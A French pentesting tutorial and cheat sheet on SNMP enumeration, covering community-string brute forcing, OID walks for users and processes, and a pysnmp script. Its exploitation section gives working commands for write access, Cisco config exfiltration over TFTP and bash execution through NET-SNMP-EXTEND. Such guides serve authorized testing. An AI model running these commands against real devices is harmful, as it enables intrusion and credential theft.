# 📡 SNMP Enumeration - Guide Complet

Guide exhaustif pour l'énumération et l'exploitation du protocole SNMP.

---

## 📖 Concepts de Base

### Qu'est-ce que SNMP ?

**SNMP** (Simple Network Management Protocol) permet de surveiller et gérer les équipements réseau.

```
Port 161 UDP : Requêtes/Réponses SNMP
Port 162 UDP : SNMP Traps (notifications)
```

### Versions SNMP

```
SNMPv1 : Community strings en clair (insécure)
SNMPv2c: Community strings en clair (plus de fonctionnalités)
SNMPv3 : Authentification et chiffrement (recommandé)
```

### Community Strings

```
Lecture seule : public (défaut)
Lecture/écriture : private (défaut)
```

### OID (Object Identifier)

```
Structure hiérarchique pour identifier les informations
Ex: 1.3.6.1.2.1.1.1.0 = sysDescr (description système)

MIB (Management Information Base) = base de données des OIDs
```

---

## 1️⃣ Découverte et Scan

### Nmap

```bash
# Détection SNMP
nmap -sU -p 161 TARGET
nmap -sU -p 161 --script=snmp-info TARGET

# Scripts SNMP complets
nmap -sU -p 161 --script=snmp-* TARGET

# Scripts spécifiques
nmap -sU -p 161 --script=snmp-brute TARGET
nmap -sU -p 161 --script=snmp-interfaces TARGET
nmap -sU -p 161 --script=snmp-netstat TARGET
nmap -sU -p 161 --script=snmp-processes TARGET
nmap -sU -p 161 --script=snmp-sysdescr TARGET
nmap -sU -p 161 --script=snmp-win32-services TARGET
nmap -sU -p 161 --script=snmp-win32-shares TARGET
nmap -sU -p 161 --script=snmp-win32-software TARGET
nmap -sU -p 161 --script=snmp-win32-users TARGET
```

### Onesixtyone

```bash
# Brute force des community strings
onesixtyone -c community_strings.txt TARGET
onesixtyone -c community_strings.txt -i targets.txt

# Wordlist de community strings
# public, private, manager, admin, cisco, cable-docsis, etc.
```

### snmp-check

```bash
# Énumération complète
snmp-check TARGET
snmp-check -c public TARGET
snmp-check -c private -v 2c TARGET

# Options
-c : Community string
-v : Version (1, 2c)
-w : Check write access
```

---

## 2️⃣ Énumération avec snmpwalk

### Commandes de base

```bash
# Walk complet (tout l'arbre)
snmpwalk -v 2c -c public TARGET

# Walk d'un OID spécifique
snmpwalk -v 2c -c public TARGET 1.3.6.1.2.1.1

# Avec noms MIB (plus lisible)
snmpwalk -v 2c -c public TARGET -m ALL

# Version 1
snmpwalk -v 1 -c public TARGET

# Version 3 (avec auth)
snmpwalk -v 3 -u username -l authPriv -a SHA -A authpass -x AES -X privpass TARGET
```

### OIDs importants

```bash
# System Info
snmpwalk -v 2c -c public TARGET 1.3.6.1.2.1.1     # System
snmpwalk -v 2c -c public TARGET 1.3.6.1.2.1.1.1.0 # sysDescr
snmpwalk -v 2c -c public TARGET 1.3.6.1.2.1.1.3.0 # sysUpTime
snmpwalk -v 2c -c public TARGET 1.3.6.1.2.1.1.4.0 # sysContact
snmpwalk -v 2c -c public TARGET 1.3.6.1.2.1.1.5.0 # sysName
snmpwalk -v 2c -c public TARGET 1.3.6.1.2.1.1.6.0 # sysLocation

# Interfaces réseau
snmpwalk -v 2c -c public TARGET 1.3.6.1.2.1.2.2.1.2  # ifDescr
snmpwalk -v 2c -c public TARGET 1.3.6.1.2.1.4.20.1.1 # IP addresses

# Routing
snmpwalk -v 2c -c public TARGET 1.3.6.1.2.1.4.21    # ipRouteTable

# ARP
snmpwalk -v 2c -c public TARGET 1.3.6.1.2.1.4.22.1.2 # ipNetToMediaPhysAddress

# TCP connections
snmpwalk -v 2c -c public TARGET 1.3.6.1.2.1.6.13    # tcpConnTable

# UDP listeners
snmpwalk -v 2c -c public TARGET 1.3.6.1.2.1.7.5     # udpTable

# Processes (HOST-RESOURCES-MIB)
snmpwalk -v 2c -c public TARGET 1.3.6.1.2.1.25.4.2.1.2 # hrSWRunName
snmpwalk -v 2c -c public TARGET 1.3.6.1.2.1.25.4.2.1.4 # hrSWRunPath
snmpwalk -v 2c -c public TARGET 1.3.6.1.2.1.25.4.2.1.5 # hrSWRunParameters

# Installed software
snmpwalk -v 2c -c public TARGET 1.3.6.1.2.1.25.6.3.1.2 # hrSWInstalledName

# Storage
snmpwalk -v 2c -c public TARGET 1.3.6.1.2.1.25.2    # hrStorage

# Users (Windows)
snmpwalk -v 2c -c public TARGET 1.3.6.1.4.1.77.1.2.25 # Users

# Shares (Windows)
snmpwalk -v 2c -c public TARGET 1.3.6.1.4.1.77.1.2.27 # Shares
```

### OIDs Windows spécifiques

```bash
# Utilisateurs Windows
snmpwalk -v 2c -c public TARGET 1.3.6.1.4.1.77.1.2.25

# Services Windows
snmpwalk -v 2c -c public TARGET 1.3.6.1.4.1.77.1.2.3.1.1

# Partages Windows
snmpwalk -v 2c -c public TARGET 1.3.6.1.4.1.77.1.2.27

# Logiciels installés
snmpwalk -v 2c -c public TARGET 1.3.6.1.2.1.25.6.3.1.2

# Disques
snmpwalk -v 2c -c public TARGET 1.3.6.1.2.1.25.2.3.1.3

# Ports TCP ouverts
snmpwalk -v 2c -c public TARGET 1.3.6.1.2.1.6.13.1.3

# Hostname
snmpwalk -v 2c -c public TARGET .1.3.6.1.2.1.1.5
```

### OIDs Cisco

```bash
# Version IOS
snmpwalk -v 2c -c public TARGET 1.3.6.1.4.1.9.9.25.1.1.1.2

# Interfaces
snmpwalk -v 2c -c public TARGET 1.3.6.1.2.1.2.2.1.2

# VLANs
snmpwalk -v 2c -c public TARGET 1.3.6.1.4.1.9.9.46

# Usernames (config)
snmpwalk -v 2c -c public TARGET 1.3.6.1.4.1.9.2.1.8
```

---

## 3️⃣ Exploitation

### Écriture SNMP (si community RW)

```bash
# Vérifier l'accès en écriture
snmpset -v 2c -c private TARGET 1.3.6.1.2.1.1.6.0 s "test"

# Modifier le contact système
snmpset -v 2c -c private TARGET 1.3.6.1.2.1.1.4.0 s "hacked@evil.com"

# Modifier la location
snmpset -v 2c -c private TARGET 1.3.6.1.2.1.1.6.0 s "pwned"
```

### Cisco - TFTP Config Extraction

```bash
# Si community RW disponible sur un routeur Cisco
# 1. Définir le serveur TFTP
snmpset -v 2c -c private TARGET 1.3.6.1.4.1.9.2.1.55.IP_TFTP s "running-config"

# 2. Le routeur envoie sa config au serveur TFTP
# Analyser pour trouver des credentials
```

### RCE via SNMP Extend (Net-SNMP)

```bash
# Si la directive "extend" est configurée et writable
# On peut exécuter des commandes

# OID pour NET-SNMP-EXTEND-MIB
# 1.3.6.1.4.1.8072.1.3.2

# Créer un script d'extension
snmpset -v 2c -c private TARGET \
    'NET-SNMP-EXTEND-MIB::nsExtendStatus."cmd"' = createAndGo \
    'NET-SNMP-EXTEND-MIB::nsExtendCommand."cmd"' = /bin/bash \
    'NET-SNMP-EXTEND-MIB::nsExtendArgs."cmd"' = "-c 'id > /tmp/pwned'"

# Exécuter
snmpwalk -v 2c -c public TARGET NET-SNMP-EXTEND-MIB::nsExtendObjects
```

---

## 4️⃣ Brute Force Community Strings

### Wordlists

```bash
# Créer une wordlist
cat > community.txt << EOF
public
private
manager
admin
cisco
cable-docsis
secret
community
default
password
EOF

# Wordlists existantes
/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
```

### Outils de brute force

```bash
# Onesixtyone (le plus rapide)
onesixtyone -c community.txt TARGET
onesixtyone -c community.txt -i targets.txt

# Hydra
hydra -P community.txt TARGET snmp

# Nmap
nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=community.txt TARGET

# Metasploit
use auxiliary/scanner/snmp/snmp_login
set RHOSTS TARGET
set PASS_FILE community.txt
run
```

---

## 5️⃣ Outils Automatisés

### snmpwn

```bash
# https://github.com/hatlord/snmpwn
# Énumération automatisée avec analyse

snmpwn.rb TARGET public
```

### Metasploit

```bash
# Énumération
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS TARGET
set COMMUNITY public
run

# Énumération Windows
use auxiliary/scanner/snmp/snmp_enumusers
use auxiliary/scanner/snmp/snmp_enumshares

# Login brute force
use auxiliary/scanner/snmp/snmp_login
```

### Script Python

```python
#!/usr/bin/env python3
from pysnmp.hlapi import *

def snmp_walk(target, community, oid):
    results = []
    
    for (errorIndication, errorStatus, errorIndex, varBinds) in nextCmd(
        SnmpEngine(),
        CommunityData(community),
        UdpTransportTarget((target, 161)),
        ContextData(),
        ObjectType(ObjectIdentity(oid)),
        lexicographicMode=False
    ):
        if errorIndication or errorStatus:
            break
        
        for varBind in varBinds:
            results.append(f'{varBind[0]} = {varBind[1]}')
    
    return results

# Usage
target = "192.168.1.1"
community = "public"

# System info
print("[+] System Info:")
for line in snmp_walk(target, community, '1.3.6.1.2.1.1'):
    print(f"    {line}")

# Users (Windows)
print("\n[+] Users:")
for line in snmp_walk(target, community, '1.3.6.1.4.1.77.1.2.25'):
    print(f"    {line}")

# Processes
print("\n[+] Processes:")
for line in snmp_walk(target, community, '1.3.6.1.2.1.25.4.2.1.2'):
    print(f"    {line}")
```

---

## 6️⃣ Cheatsheet Rapide

```bash
# Scan
nmap -sU -p 161 --script=snmp-* TARGET
onesixtyone -c community.txt TARGET

# Énumération basique
snmpwalk -v 2c -c public TARGET
snmp-check TARGET

# OIDs importants
1.3.6.1.2.1.1               # System
1.3.6.1.2.1.25.4.2.1.2      # Processes
1.3.6.1.2.1.25.6.3.1.2      # Installed software
1.3.6.1.4.1.77.1.2.25       # Windows users
1.3.6.1.4.1.77.1.2.27       # Windows shares
1.3.6.1.2.1.6.13.1.3        # TCP ports

# SNMPv3
snmpwalk -v 3 -u USER -l authPriv -a SHA -A AUTHPASS -x AES -X PRIVPASS TARGET

# Écriture (si RW)
snmpset -v 2c -c private TARGET OID type value

# Brute force
onesixtyone -c wordlist.txt TARGET
hydra -P wordlist.txt TARGET snmp
```

---

## 📚 Ressources

- **HackTricks SNMP** : https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp
- **SNMP OID Reference** : http://www.oid-info.com/
- **Net-SNMP** : http://www.net-snmp.org/
- **SecLists SNMP** : https://github.com/danielmiessler/SecLists/tree/master/Discovery/SNMP

---

**Tags:** `#snmp #enumeration #community-string #oid #mib #network #windows`
